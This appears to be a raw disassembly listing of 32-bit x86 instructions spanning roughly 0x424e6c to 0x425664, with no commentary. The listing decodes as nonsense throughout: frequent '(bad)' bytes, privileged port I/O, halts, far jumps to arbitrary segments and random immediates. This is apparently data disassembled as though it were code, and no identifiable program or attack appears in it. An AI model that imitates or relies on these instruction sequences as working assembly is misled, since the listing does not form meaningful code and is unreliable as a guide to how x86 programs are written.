  424e6c:	mov    DWORD PTR [ebx-0x28],ebx
  424e6f:	call   0x88d8:0xbeed5c01
  424e76:	(bad)  
  424e77:	mov    ?,WORD PTR [edi-0x1d3d29b6]
  424e7d:	ret    
  424e7e:	add    DWORD PTR [esi+0x35780b29],esp
  424e84:	fmul   st,st(4)
  424e86:	out    dx,eax
  424e87:	push   ecx
  424e88:	push   ecx
  424e89:	or     eax,0xf449f715
  424e8e:	push   ebp
  424e8f:	sbb    esi,DWORD PTR [esi-0xa175f67]
  424e95:	in     eax,0xdf
  424e97:	pop    ss
  424e98:	inc    ebx
  424e99:	popf   
  424e9a:	les    esi,FWORD PTR [eax+0x625eaa8f]
  424ea0:	xchg   esp,eax
  424ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ea2:	(bad)  [ebp+0x63]
  424ea5:	sub    ebx,DWORD PTR [esi]
  424ea7:	(bad)  
  424ea8:	xchg   ebp,eax
  424ea9:	xchg   DWORD PTR [ebp-0x58],edi
  424eac:	loopne 0x424e60
  424eae:	mov    eax,ds:0x9bbdd657
  424eb3:	or     al,0x44
  424eb5:	(bad)  
  424eb6:	(bad)  
  424eb7:	push   ebp
  424eb8:	pushf  
  424eb9:	push   ss
  424eba:	adc    dh,bl
  424ebc:	addr16 icebp 
  424ebe:	fist   DWORD PTR [ebx+ebx*4+0xb]
  424ec2:	inc    ecx
  424ec3:	ds scas eax,DWORD PTR es:[edi]
  424ec5:	jne    0x424e7f
  424ec7:	mov    eax,gs
  424ec9:	adc    DWORD PTR [edi+0x7f],edi
  424ecc:	iret   
  424ecd:	stc    
  424ece:	pop    es
  424ecf:	xor    al,0xe9
  424ed1:	add    ah,BYTE PTR [esi+0x33]
  424ed4:	inc    ebx
  424ed5:	int3   
  424ed6:	jns    0x424f2e
  424ed8:	imul   esp,ecx,0xffffffab
  424edb:	mov    esp,0xb124e28d
  424ee0:	repz ret 0x48c9
  424ee4:	ja     0x424ed5
  424ee6:	jmp    0x45aeb028
  424eeb:	cmp    BYTE PTR ds:0xfe2bc519,ch
  424ef1:	mov    ?,WORD PTR [esi]
  424ef3:	pop    ebp
  424ef4:	push   ebp
  424ef5:	mov    bl,0xc7
  424ef7:	pop    edx
  424ef8:	rcr    edi,0xac
  424efb:	cdq    
  424efc:	inc    ebx
  424efd:	in     eax,dx
  424efe:	inc    ebx
  424eff:	retf   
  424f00:	pop    esi
  424f01:	cs into 
  424f03:	or     eax,0xde0aff77
  424f08:	push   DWORD PTR [eax]
  424f0a:	jns    0x424f83
  424f0c:	pop    edi
  424f0d:	mov    BYTE PTR [edx+0x683719eb],ch
  424f13:	and    eax,ecx
  424f15:	mov    BYTE PTR [ebx+0xa199d2],al
  424f1b:	mov    ds:0x12e0a460,al
  424f20:	scas   al,BYTE PTR es:[edi]
  424f21:	lds    ebx,FWORD PTR ds:0xb214da41
  424f27:	(bad)  
  424f28:	stc    
  424f29:	pop    ss
  424f2a:	push   ecx
  424f2b:	lods   eax,DWORD PTR ds:[esi]
  424f2c:	ss clc 
  424f2e:	ins    BYTE PTR es:[edi],dx
  424f2f:	mov    eax,0xbe34cd8
  424f34:	pusha  
  424f35:	out    dx,al
  424f36:	hlt    
  424f37:	adc    eax,0x8d2b2d8a
  424f3c:	dec    esi
  424f3d:	neg    DWORD PTR [edi]
  424f3f:	or     dl,bl
  424f41:	or     bl,ch
  424f43:	jo     0x424f97
  424f45:	(bad)  
  424f47:	mov    bh,0xc2
  424f49:	bound  esi,QWORD PTR [eax]
  424f4b:	std    
  424f4c:	repnz das 
  424f4e:	mov    dh,0xda
  424f50:	xor    eax,0xfe8b7d7b
  424f55:	in     al,0x38
  424f57:	loop   0x424f08
  424f59:	mov    ebx,0x47889900
  424f5e:	das    
  424f5f:	and    BYTE PTR [esi-0x2870ec7c],ah
  424f65:	int3   
  424f66:	test   eax,0x5dfe7a4
  424f6b:	inc    esi
  424f6d:	retf   
  424f6e:	aad    0xab
  424f70:	syscall 
  424f72:	xor    dl,BYTE PTR [edi-0x7d]
  424f75:	pushf  
  424f76:	pop    ebp
  424f77:	stc    
  424f78:	adc    al,0x1b
  424f7a:	pop    ebx
  424f7b:	scas   al,BYTE PTR es:[edi]
  424f7c:	sbb    esi,DWORD PTR [ebx-0x23]
  424f7f:	and    esi,DWORD PTR [edx]
  424f81:	pop    ebp
  424f82:	adc    DWORD PTR [esi+0x78581b87],eax
  424f88:	sub    eax,0x9e1f1890
  424f8d:	mov    ebp,0x38086a9f
  424f92:	ins    DWORD PTR es:[edi],dx
  424f93:	push   es
  424f94:	and    bh,BYTE PTR [edx+0x43]
  424f97:	push   es
  424f98:	inc    ebp
  424f99:	mov    ds:0xcf9a7de4,al
  424f9e:	prefetcht2 BYTE PTR [esi]
  424fa1:	rcl    dl,0xfc
  424fa4:	lods   eax,DWORD PTR ds:[esi]
  424fa5:	add    al,0x82
  424fa7:	es (bad) 
  424fa9:	daa    
  424faa:	(bad)  
  424fab:	jmp    0x450f:0xe07242f
  424fb2:	into   
  424fb3:	sub    eax,0x10dfffa9
  424fb8:	and    BYTE PTR [edi],ch
  424fba:	(bad)  
  424fbb:	xlat   BYTE PTR ds:[ebx]
  424fbc:	repnz sti 
  424fbe:	and    BYTE PTR [ecx-0x4c],0x47
  424fc2:	adc    BYTE PTR ds:0x51cfa1db,0xaf
  424fc9:	xchg   esi,eax
  424fca:	xor    al,0x99
  424fcc:	addr16 add al,0x88
  424fcf:	push   esp
  424fd0:	loopne 0x42501e
  424fd2:	jg     0x424ff8
  424fd4:	jno    0x425042
  424fd6:	mov    WORD PTR [edi-0x75a277d2],gs
  424fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fdd:	jmp    0xb65b7e8a
  424fe2:	xor    al,0xb7
  424fe4:	mov    esp,0x6a45e40f
  424fe9:	mov    BYTE PTR [edi],ch
  424feb:	out    dx,eax
  424fec:	loope  0x425067
  424fee:	ss inc ebp
  424ff0:	dec    esi
  424ff1:	dec    ecx
  424ff2:	sbb    BYTE PTR [ebx-0x39],dl
  424ff5:	mov    ebx,DWORD PTR [edi]
  424ff7:	sbb    ch,BYTE PTR [ebx+0x33e2f291]
  424ffd:	inc    esp
  424ffe:	loope  0x424f82
  425000:	or     BYTE PTR [ebx],dh
  425002:	inc    edx
  425003:	sub    BYTE PTR [esi],ah
  425005:	cwde   
  425006:	mov    dh,0x88
  425008:	scas   al,BYTE PTR es:[edi]
  425009:	outs   dx,DWORD PTR ds:[esi]
  42500a:	push   eax
  42500b:	jae    0x42506d
  42500d:	mov    dl,0x5e
  42500f:	adc    DWORD PTR [edx+0x22],edx
  425012:	sub    al,0xca
  425014:	ror    BYTE PTR [ebx+0x55],cl
  425017:	lea    esp,ss:[esi+0x4cb2587d]
  42501e:	test   BYTE PTR [ebp+0x29ba8209],dh
  425024:	lods   al,BYTE PTR ds:[esi]
  425025:	sbb    bh,dh
  425027:	jg     0x425086
  425029:	daa    
  42502a:	cmovbe eax,DWORD PTR [ecx]
  42502d:	xor    al,0xa3
  42502f:	setge  BYTE PTR ds:0x15e64a59
  425036:	test   al,0x2c
  425038:	sbb    BYTE PTR [esi],ch
  42503a:	mov    al,0x31
  42503c:	shr    BYTE PTR [edi],1
  42503e:	(bad)  
  42503f:	adc    BYTE PTR [ecx+0x4a579b6f],bh
  425045:	out    0x80,eax
  425047:	mov    dh,0x5f
  425049:	fdivr  DWORD PTR [ebx+eiz*2-0x44]
  42504d:	jo     0x425065
	...
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0xbc
  425067:	das    
  425068:	icebp  
  425069:	fistp  WORD PTR [edi-0x2fffe38]
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [esi],cl
  425073:	or     ecx,esi
  425075:	mov    dl,0x8e
  425077:	cmp    ecx,DWORD PTR [ecx+0x45]
  42507a:	xor    DWORD PTR [edx],ebx
  42507c:	call   0x79d0:0x2c31c7f4
  425083:	push   ecx
  425084:	mov    DWORD PTR [edx-0x27],edi
  425087:	jae    0x425076
  425089:	stos   BYTE PTR es:[edi],al
  42508a:	or     ebx,ebp
  42508c:	cmp    eax,0xdc0c689a
  425091:	add    ebx,DWORD PTR [esi+edi*8]
  425094:	rcl    BYTE PTR [ecx+0x5a164450],cl
  42509a:	les    esp,FWORD PTR [edi*8+0x3dd32e4c]
  4250a1:	inc    ecx
  4250a2:	outs   dx,BYTE PTR ds:[esi]
  4250a3:	out    0xc8,eax
  4250a5:	outs   dx,DWORD PTR ds:[esi]
  4250a6:	and    dh,dh
  4250a8:	mov    ebp,0x2a000a2f
  4250ad:	cmp    al,0x6b
  4250af:	push   ebx
  4250b0:	pop    ebx
  4250b1:	xchg   ebp,eax
  4250b2:	scas   al,BYTE PTR es:[edi]
  4250b3:	shr    DWORD PTR [edi-0x3e],1
  4250b6:	sub    eax,0x186b4882
  4250bb:	xor    ebp,esi
  4250bd:	inc    esp
  4250be:	test   eax,0x6fabc0ca
  4250c3:	mov    bh,0x5e
  4250c5:	cdq    
  4250c6:	sub    BYTE PTR [eax-0x37],0x23
  4250ca:	shl    eax,cl
  4250cc:	daa    
  4250cd:	out    dx,eax
  4250ce:	int    0xe3
  4250d0:	test   eax,0x900dc48d
  4250d5:	xor    bl,BYTE PTR [esi-0x15]
  4250d8:	aad    0xe5
  4250da:	jmp    0x371:0x5abfe7e1
  4250e1:	push   cs
  4250e2:	lahf   
  4250e3:	fcom   QWORD PTR [edx+0x27]
  4250e6:	push   cs
  4250e7:	push   cs
  4250e8:	(bad)  
  4250ea:	jg     0x4250fb
  4250ec:	loope  0x425159
  4250ee:	dec    edi
  4250ef:	add    al,BYTE PTR [ecx-0x5d]
  4250f2:	std    
  4250f3:	outs   dx,DWORD PTR ds:[esi]
  4250f4:	cdq    
  4250f5:	add    dl,BYTE PTR [esi-0x1f]
  4250f8:	mov    ebx,0xd2bf3401
  4250fd:	mov    ah,0x91
  4250ff:	xchg   edi,eax
  425100:	mov    bl,0x2a
  425102:	(bad)  
  425103:	repnz mov eax,0x954b1113
  425109:	sbb    edx,DWORD PTR [ebx]
  42510b:	lea    esp,[edi-0x4e313087]
  425111:	mov    BYTE PTR [ebx-0x26],dh
  425114:	call   0x749acf45
  425119:	(bad)  
  42511a:	add    ch,BYTE PTR [ecx-0x1c]
  42511d:	sub    al,0xbc
  42511f:	pop    edx
  425120:	cmp    bh,cl
  425122:	jge    0x4250c1
  425124:	dec    edx
  425125:	pusha  
  425126:	dec    edi
  425127:	mov    ebp,0x7c464be3
  42512c:	inc    esp
  42512d:	dec    ebx
  42512e:	mov    eax,ds:0xb1f0b2ec
  425133:	inc    ebp
  425134:	retf   
  425135:	push   ds
  425136:	es imul edi,edx,0xcbe9ba15
  42513d:	inc    esp
  42513e:	lock push esp
  425140:	and    ebx,DWORD PTR [edx+0x3f969cd]
  425146:	js     0x425175
  425148:	push   es
  425149:	sbb    BYTE PTR [eax],al
  42514b:	scas   al,BYTE PTR es:[edi]
  42514c:	push   esi
  42514d:	inc    edx
  42514e:	enter  0xaaef,0x95
  425152:	test   eax,0xdc5fe7a
  425157:	mov    esi,ebp
  425159:	cmp    al,0x80
  42515b:	ins    BYTE PTR es:[edi],dx
  42515c:	dec    ecx
  42515d:	ror    ecx,cl
  42515f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425161:	push   0x30
  425163:	in     al,0x6a
  425165:	jns    0x425188
  425167:	sbb    al,BYTE PTR [ebx-0x26]
  42516a:	push   edi
  42516b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42516c:	fwait
  42516d:	mov    ah,0x6c
  42516f:	and    eax,0x9cdbfb89
  425174:	mov    esp,0xaf1d3f06
  425179:	lods   eax,DWORD PTR ds:[esi]
  42517a:	or     eax,0xf6f2847e
  42517f:	mov    ds:0x7ddb0f31,al
  425184:	dec    eax
  425185:	inc    esi
  425186:	sub    al,BYTE PTR [eax*8-0x65c1419e]
  42518d:	mov    esp,0x43f02a29
  425192:	push   0x61
  425194:	adc    eax,DWORD PTR [esi]
  425196:	popf   
  425197:	movaps XMMWORD PTR [edi],xmm4
  42519a:	add    bl,bh
  42519c:	lock iret 
  42519e:	and    bl,0x41
  4251a1:	xchg   edx,eax
  4251a2:	not    BYTE PTR [esi-0x78]
  4251a5:	cmp    ebp,DWORD PTR [ebx-0x3682eea7]
  4251ab:	(bad)  
  4251ad:	sub    DWORD PTR [ebp-0x5fcf6497],esi
  4251b3:	jb     0x4251ea
  4251b5:	(bad)  
  4251b6:	pop    ss
  4251b7:	pop    ds
  4251b8:	sahf   
  4251b9:	xor    al,0xb7
  4251bb:	cmp    ebx,edi
  4251bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251be:	jb     0x425173
  4251c0:	cmp    eax,DWORD PTR [esi]
  4251c2:	popa   
  4251c3:	mov    ch,0x94
  4251c5:	test   BYTE PTR ds:0x2abd642f,dh
  4251cb:	stos   DWORD PTR es:[edi],eax
  4251cc:	mov    gs,WORD PTR [ebp+eiz*8-0x9]
  4251d0:	mov    esi,DWORD PTR [eax+0x48]
  4251d3:	mov    ecx,0x7a73937f
  4251d8:	jmp    0x425232
  4251da:	push   ecx
  4251db:	mov    bl,0x1d
  4251dd:	sahf   
  4251de:	ret    
  4251df:	in     al,0x1b
  4251e1:	repz sub al,0x62
  4251e4:	and    BYTE PTR [edi],cl
  4251e6:	mov    edx,0x67675878
  4251eb:	dec    esi
  4251ec:	adc    eax,DWORD PTR [edi]
  4251ee:	ins    BYTE PTR es:[edi],dx
  4251ef:	and    cl,BYTE PTR [eax+0x777c8d5c]
  4251f5:	outs   dx,BYTE PTR ds:[esi]
  4251f6:	xchg   BYTE PTR [eax],cl
  4251f8:	sbb    DWORD PTR [ecx-0x4cfdd2a5],0xeb01229a
  425202:	or     BYTE PTR [eax-0x1d0a82fe],ch
  425208:	int    0x87
  42520a:	ret    
  42520b:	aam    0x46
  42520d:	adc    BYTE PTR [esi],cl
  42520f:	cmp    DWORD PTR [edi-0x1cd9c86d],eax
  425215:	ret    0x4dd7
  425218:	xor    al,0x42
  42521a:	test   DWORD PTR [eax-0x21555a63],0x5d90477a
  425224:	cwde   
  425225:	js     0x42522d
  425227:	adc    eax,0x8cac9d90
  42522c:	cli    
  42522d:	lds    ebp,FWORD PTR [ecx+0x760a732c]
  425233:	xlat   BYTE PTR ds:[ebx]
  425234:	mov    cl,0xa1
  425236:	inc    esp
  425237:	dec    eax
  425238:	inc    esp
  425239:	mov    ah,0x2b
  42523b:	xchg   esi,eax
  42523c:	mov    ds:0x5b0e1b63,eax
  425241:	xor    esp,DWORD PTR [ecx+ecx*2+0x1]
  425245:	xchg   ebx,eax
  425246:	or     BYTE PTR [edx-0x49],0x5f
  42524a:	xchg   BYTE PTR [ebx-0x5af08d64],bh
  425250:	sbb    ebp,esp
  425252:	hlt    
  425253:	jp     0x42527d
  425255:	test   BYTE PTR [esi-0x4195c459],bh
  42525b:	or     eax,0x6948f6bc
  425260:	inc    ebx
  425261:	in     al,dx
  425262:	std    
  425263:	in     eax,dx
  425264:	shl    DWORD PTR [edi-0x45],cl
  425267:	pusha  
  425268:	push   0x2
  42526a:	jne    0x425253
  42526c:	push   ebx
  42526d:	test   al,0x93
	...
  425277:	add    BYTE PTR [eax],al
  425279:	add    ah,dh
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	push   es
  425287:	repnz xchg edi,eax
  425289:	rcr    BYTE PTR [edx+ecx*8+0x1fd0001],cl
  425290:	add    BYTE PTR [eax],al
  425292:	inc    eax
  425293:	dec    ebx
  425294:	pusha  
  425295:	repnz ins BYTE PTR es:[edi],dx
  425297:	pushf  
  425298:	push   esp
  425299:	sahf   
  42529a:	jmp    FWORD PTR [edx+0x20]
  42529d:	lods   al,BYTE PTR ds:[esi]
  42529e:	adc    cl,dh
  4252a0:	and    BYTE PTR [eax],al
  4252a2:	or     DWORD PTR [edx-0x3],edi
  4252a5:	inc    ebp
  4252a6:	mov    esi,DWORD PTR [edx+0x69]
  4252a9:	or     DWORD PTR [ecx+0x1e2a06f7],edi
  4252af:	pop    edi
  4252b0:	addr16 out 0xa1,eax
  4252b3:	mov    ebp,0xcbebe88a
  4252b8:	add    eax,0xccdb0d38
  4252bd:	xchg   edx,eax
  4252be:	inc    esi
  4252bf:	add    eax,0xaef187bb
  4252c4:	jns    0x42532c
  4252c6:	shr    DWORD PTR [edx],1
  4252c8:	mov    edi,0x93b575fd
  4252cd:	adc    bl,bh
  4252cf:	daa    
  4252d0:	rcl    BYTE PTR [edx+0x101b4ea9],0xe9
  4252d7:	iret   
  4252d8:	ret    0x11d8
  4252db:	mov    ?,WORD PTR ds:0x57fa65d0
  4252e1:	test   DWORD PTR [ebx-0x29],ecx
  4252e4:	xchg   ecx,eax
  4252e5:	add    DWORD PTR [ebp+0x64],0xffffffb3
  4252e9:	daa    
  4252ea:	das    
  4252eb:	pushf  
  4252ec:	je     0x4252f0
  4252ee:	fisttp WORD PTR [edx+esi*4-0x317be741]
  4252f5:	sbb    eax,0x3236cb2
  4252fa:	push   esp
  4252fb:	xchg   ecx,eax
  4252fc:	into   
  4252fd:	adc    eax,0x5a4c1533
  425302:	mov    esp,0xfe19a444
  425307:	sub    al,BYTE PTR [edx+eax*1]
  42530a:	test   dl,al
  42530c:	lfs    eax,FWORD PTR [ebx-0x46]
  425310:	js     0x425330
  425312:	(bad)  
  425313:	push   ebx
  425314:	int3   
  425315:	out    0x1b,eax
  425317:	mov    bl,0x66
  425319:	cli    
  42531a:	and    DWORD PTR [ebp+esi*8-0x587d50fe],ebp
  425321:	jae    0x425356
  425323:	push   ebx
  425324:	gs nop
  425326:	fcmovbe st,st(6)
  425328:	dec    esi
  425329:	mov    eax,0xf526bad4
  42532e:	pop    edx
  42532f:	sbb    al,0x4d
  425331:	push   ds
  425332:	mov    ebx,0x78392a09
  425337:	idiv   eax
  425339:	xchg   ecx,eax
  42533a:	xlat   BYTE PTR ds:[ebx]
  42533b:	jne    0x4252d6
  42533d:	scas   eax,DWORD PTR es:[edi]
  42533e:	jp     0x42538c
  425340:	xchg   edi,eax
  425341:	sub    al,0xb2
  425343:	jg     0x4252d9
  425345:	mov    bl,0x1a
  425347:	(bad)  
  425348:	out    dx,al
  425349:	ret    
  42534a:	mov    dh,0xf
  42534c:	push   es
  42534d:	js     0x425322
  42534f:	retf   0x5bca
  425352:	addr16 aas 
  425354:	mov    BYTE PTR [edi],ah
  425356:	mov    dh,0x76
  425358:	push   ecx
  425359:	or     al,0x0
  42535b:	xchg   BYTE PTR [eax+0x31a55a6],ch
  425361:	dec    ebp
  425362:	sbb    bl,BYTE PTR [edx]
  425364:	scas   al,BYTE PTR es:[edi]
  425365:	jb     0x42537a
  425367:	add    BYTE PTR [edi-0x3c],bh
  42536a:	mov    esp,0xed2d49dc
  42536f:	pusha  
  425370:	mov    gs,WORD PTR [esi+esi*8-0x58eae917]
  425377:	xchg   edx,eax
  425378:	fdivr  st,st(7)
  42537a:	int    0xc3
  42537c:	pop    esi
  42537d:	xor    DWORD PTR [edx],ebx
  42537f:	ja     0x42539d
  425381:	ds call 0xe71f695e
  425387:	xor    eax,0x25cd28bd
  42538c:	jae    0x425327
  42538e:	jmp    0xb9c0250f
  425393:	xor    eax,0x338af8c0
  425398:	add    dl,BYTE PTR [ecx-0x77e9016f]
  42539e:	js     0x425373
  4253a0:	loope  0x42535b
  4253a2:	ins    DWORD PTR es:[edi],dx
  4253a3:	mov    dh,bh
  4253a5:	shl    BYTE PTR [ebp+0x0],cl
  4253a8:	push   ebx
  4253a9:	cmp    bh,dl
  4253ab:	fdiv   st,st(7)
  4253ad:	in     eax,dx
  4253ae:	push   ecx
  4253af:	bswap  esi
  4253b1:	jne    0x425357
  4253b3:	dec    edx
  4253b4:	aad    0xd8
  4253b6:	mov    eax,ds:0x3ce57d65
  4253bb:	sub    eax,edi
  4253bd:	in     al,dx
  4253be:	(bad)  
  4253bf:	cmp    al,BYTE PTR [edx+0x59008c81]
  4253c5:	mov    WORD PTR [eax-0x4597474a],fs
  4253cb:	cmp    eax,0xf7e7c9b3
  4253d0:	push   ss
  4253d1:	in     eax,dx
  4253d2:	dec    ebp
  4253d3:	ins    BYTE PTR es:[edi],dx
  4253d4:	cmp    al,0xcb
  4253d6:	shl    BYTE PTR [edx+0x24228082],0x8e
  4253dd:	mov    ch,0x44
  4253df:	add    dl,BYTE PTR [edx-0x77]
  4253e2:	mov    eax,ds:0x9ed8907e
  4253e7:	mov    ds:0x26ae896b,eax
  4253ec:	scas   eax,DWORD PTR es:[edi]
  4253ed:	daa    
  4253ee:	sti    
  4253ef:	(bad)  
  4253f0:	jecxz  0x425414
  4253f2:	jl     0x42540e
  4253f4:	sbb    BYTE PTR [edi+0x7a15ac39],0x24
  4253fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253fc:	fsubp  st(2),st
  4253fe:	pop    eax
  4253ff:	fwait
  425400:	aas    
  425401:	fist   DWORD PTR ss:[ebx-0x34846e16]
  425408:	and    DWORD PTR [ebx+0x3a],edi
  42540b:	jecxz  0x425401
  42540d:	retf   0xdc22
  425410:	lods   eax,DWORD PTR ds:[esi]
  425411:	pusha  
  425412:	gs out dx,al
  425414:	mov    dh,BYTE PTR [edx-0x6f]
  425417:	retf   
  425418:	jmp    0x1c2d:0x386c9917
  42541f:	hlt    
  425420:	sbb    eax,0x9ed68efa
  425425:	xchg   ecx,eax
  425426:	push   0xb73113ca
  42542b:	mov    DWORD PTR ds:0xf595a932,edi
  425431:	scas   eax,DWORD PTR es:[edi]
  425432:	test   esi,edx
  425434:	in     al,dx
  425435:	repnz and BYTE PTR [edi-0x3b],0x0
  42543a:	ds test al,0x42
  42543d:	sub    cl,BYTE PTR [esi-0x70]
  425440:	std    
  425441:	pop    edi
  425442:	in     al,0x3f
  425444:	xor    al,0xeb
  425446:	lea    edx,[ebx+ebx*4]
  425449:	fwait
  42544a:	cmp    al,0x6
  42544c:	es je  0x4254c1
  42544f:	lahf   
  425450:	mov    bh,0x72
  425452:	sub    al,0x7f
  425454:	mov    dh,BYTE PTR [esi]
  425456:	adc    ch,BYTE PTR [esp+ebp*2+0x12]
  42545a:	fist   WORD PTR [edi*1+0x319ea9fa]
  425461:	pushf  
  425462:	jmp    0xb47c:0xd92f0ffa
  425469:	mov    BYTE PTR [esi],cl
  42546b:	loopne 0x4254eb
  42546d:	mov    esp,0x1bd7eda2
  425472:	cmp    ebp,DWORD PTR [ebx]
  425474:	add    BYTE PTR [ebx+eiz*2],0xe3
  425478:	(bad)
  42547d:	mov    DWORD PTR [eax+ebx*4+0x61cee41a],ebx
  425484:	mov    esi,0x6316a837
  425489:	cmp    ch,al
  42548b:	mov    eax,0x833336
	...
  425498:	add    BYTE PTR [eax],al
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	out    dx,eax
  4254a7:	in     eax,0x63
  4254a9:	pop    ebx
  4254aa:	cdq    
  4254ab:	int3   
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	std    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [edi-0x48],cl
  4254b4:	(bad)  
  4254b5:	jmp    0xdea3:0xabe2afd3
  4254bc:	mov    ebx,?
  4254be:	xor    eax,0x46dd0e37
  4254c3:	retf   0xc6a6
  4254c6:	mov    ds:0xa3815415,eax
  4254cb:	repnz ss aaa 
  4254ce:	ss jne 0x4254e2
  4254d1:	xor    eax,0x3740f763
  4254d6:	jo     0x4254fe
  4254d8:	fdivr  st(2),st
  4254da:	add    al,0xd0
  4254dc:	cmp    edi,DWORD PTR [esi]
  4254de:	pop    ebx
  4254df:	pop    ss
  4254e0:	cmp    BYTE PTR ss:[edi],dh
  4254e3:	sub    ah,bh
  4254e5:	movups XMMWORD PTR [ebp-0x4101c961],xmm2
  4254ec:	mov    bl,0xb7
  4254ee:	inc    ecx
  4254ef:	rol    al,1
  4254f1:	xchg   edi,eax
  4254f2:	aam    0xf0
  4254f4:	fld    TBYTE PTR [ebx]
  4254f6:	dec    ebx
  4254f7:	xor    DWORD PTR [esi+esi*4+0x7c],ebp
  4254fb:	imul   ecx,DWORD PTR [ebp+0xee44629],0x2f6d4b35
  425505:	aaa    
  425506:	nop
  425507:	inc    esp
  425508:	mov    ds:0xcb520eb6,al
  42550d:	cmp    al,0x36
  42550f:	mov    esp,0x2f9b3aab
  425514:	stos   DWORD PTR es:[edi],eax
  425515:	add    BYTE PTR [ecx+edx*2-0x8da381a],ah
  42551c:	inc    ebp
  42551d:	shl    cl,0xb1
  425520:	xchg   esp,eax
  425521:	pop    esp
  425522:	mov    ebx,0x92f8cf5f
  425527:	repnz cmp eax,0x7a4a8d63
  42552d:	mov    dh,0x84
  42552f:	mov    ecx,0xc2acb529
  425534:	call   0x4de2:0xb394279
  42553b:	ins    BYTE PTR es:[edi],dx
  42553c:	push   edi
  42553d:	push   cs
  42553e:	outs   dx,BYTE PTR ds:[esi]
  42553f:	push   esi
  425540:	add    BYTE PTR [eax+ecx*1-0x3fc3506],ah
  425547:	mov    ds:0x40cc39db,al
  42554c:	aas    
  42554d:	mov    ds:0x27313e17,al
  425552:	imul   esi,eax,0xf2f1ad52
  425558:	mov    esp,0xe65f6a07
  42555d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42555e:	and    edi,DWORD PTR [edx-0x488bc963]
  425564:	cli    
  425565:	xchg   BYTE PTR [ebx],al
  425567:	xchg   edx,eax
  425568:	div    DWORD PTR [ebp-0x78dc61e9]
  42556e:	cmc    
  42556f:	pop    edi
  425570:	inc    ecx
  425571:	data16 ror BYTE PTR [edi],1
  425574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425576:	enter  0x126f,0xa3
  42557a:	neg    BYTE PTR ds:0x13936274
  425580:	out    dx,eax
  425581:	in     eax,dx
  425582:	das    
  425583:	test   eax,0x263ee4fb
  425588:	cdq    
  425589:	jo     0x425529
  42558b:	xchg   ecx,eax
  42558c:	jnp    0x425554
  42558e:	fsub   DWORD PTR [ebp+eax*1+0x74243f93]
  425595:	sbb    eax,0xb977c75e
  42559a:	ins    BYTE PTR es:[edi],dx
  42559b:	jge    0x4255ef
  42559d:	cmp    ecx,ebx
  42559f:	mov    ebx,0xf11a9cd5
  4255a4:	shr    DWORD PTR [edi],0x54
  4255a7:	xchg   ebp,eax
  4255a8:	clc    
  4255a9:	lods   eax,DWORD PTR ds:[esi]
  4255aa:	and    DWORD PTR [ebp+0x8fc0e7b],edx
  4255b0:	fcomp  st(2)
  4255b2:	int    0x2d
  4255b4:	sub    DWORD PTR [ecx],ebx
  4255b6:	retf   0xc149
  4255b9:	lds    ebp,FWORD PTR [edx+ebx*2]
  4255bc:	mov    ebx,0xb4ab0ac8
  4255c1:	es jg  0x425616
  4255c4:	mov    al,0xbb
  4255c6:	add    eax,0x3c96ff95
  4255cb:	dec    edi
  4255cc:	mov    cl,0xe1
  4255ce:	add    al,0xd7
  4255d0:	ss pop DWORD PTR gs:[edi-0x9]
  4255d5:	out    dx,al
  4255d6:	push   0x24366d3a
  4255db:	pop    edi
  4255dc:	mov    esp,0xd92449b7
  4255e1:	jmp    0x4255d8
  4255e3:	cmp    eax,0xd590b8c5
  4255e8:	pop    ebp
  4255e9:	lods   eax,DWORD PTR ds:[esi]
  4255ea:	clc    
  4255eb:	add    BYTE PTR [edi-0x43],al
  4255ee:	sar    al,cl
  4255f0:	sub    edi,DWORD PTR [ebp+0x4d6777f]
  4255f6:	fnstsw WORD PTR [edx-0x5dce0ddb]
  4255fc:	in     al,dx
  4255fd:	cvtps2pd xmm5,xmm1
  425600:	add    ecx,0x468fe5f1
  425606:	pop    ds
  425607:	(bad)  [eax+0x4cfca5df]
  42560d:	jae    0x425596
  42560f:	cli    
  425610:	mov    ds:0xb31f1ba4,al
  425615:	jp     0x425610
  425617:	xor    al,0xdd
  425619:	jnp    0x4255d8
  42561b:	push   esp
  42561c:	mov    ecx,0x544bb3d7
  425621:	mov    ds,WORD PTR [ebx+0x6e]
  425624:	in     eax,dx
  425625:	or     eax,ecx
  425627:	push   es
  425628:	dec    ebp
  425629:	sbb    BYTE PTR [ebx],dh
  42562b:	iret   
  42562c:	fwait
  42562d:	cs dec edi
  42562f:	ret    
  425630:	cmp    al,0x99
  425632:	leave  
  425633:	xor    bh,BYTE PTR [ecx+eax*4-0x754176c5]
  42563a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42563b:	push   cs
  42563c:	sbb    eax,0x3f88bc4
  425641:	shl    DWORD PTR [ebx+0x7ffc5053],cl
  425647:	push   ds
  425648:	pushf  
  425649:	mov    bh,0x7
  42564b:	jmp    0x425620
  42564d:	aam    0x97
  42564f:	enter  0x7db7,0x59
  425653:	jg     0x4256c4
  425655:	ret    0x8187
  425658:	or     al,0x3e
  42565a:	dec    ebp
  42565b:	cmc    
  42565c:	jecxz  0x4256b1
  42565e:	pushf  
  42565f:	fist   DWORD PTR [eax]
  425661:	mov    fs,WORD PTR [ecx-0x7b]
  425664:	push   ds
